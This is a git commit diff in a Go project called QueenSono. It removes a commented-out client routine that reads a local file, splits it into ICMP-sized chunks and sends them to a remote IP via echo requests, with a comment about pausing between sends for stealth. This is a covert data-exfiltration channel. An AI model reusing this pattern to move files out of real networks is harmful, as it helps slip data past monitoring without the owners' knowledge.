dfa8e86bc152fe0ebb9fb03097288232b35b882d
ariary <ariary9.2@hotmail.fr>
2021-08-31 15:20:37 +0200

    Update main.go

--- cmd/client/main.go
+++ cmd/client/main.go
@@ -1,38 +1,3 @@
-// package main
-
-// import (
-// 	"fmt"
-// 	"io/ioutil"
-// 	"strconv"
-// 	"time"
-
-// 	"github.com/ariary/QueenSono/pkg/icmp"
-// )
-
-// func main() {
-// 	remoteAddr := "10.0.2.15"
-// 	listenAddr := "127.0.0.1"
-// 	//data := "totoc,titi,tata,tutu,tyty,deuxfois,totoc,titi,tata,tutu,tyty,deuxfois"
-// 	b, err := ioutil.ReadFile("bible.txt") // just pass the file name
-// 	if err != nil {
-// 		fmt.Print(err)
-// 	}
-
-// 	data := string(b)
-
-// 	// hash := utils.Sha1(data)
-// 	// go icmp.IntegrityCheck(hash)
-// 	dataSlice := icmp.Chunks(data, 65507) //1 character = 1byte , max size of icmp data 65507
-// 	// Announce the data size
-// 	icmp.SendWhileNoEchoReply(listenAddr, strconv.Itoa(len(dataSlice)), remoteAddr)
-
-// 	//Send the data
-// 	for i := 0; i < len(dataSlice); i++ {
-// 		icmp.SendWhileNoEchoReply(listenAddr, dataSlice[i], remoteAddr)
-// 		time.Sleep(1 * time.Second) //Should be passed in paramater later for stealthness
-// 	}
-// }
-
 package main
 
 import (
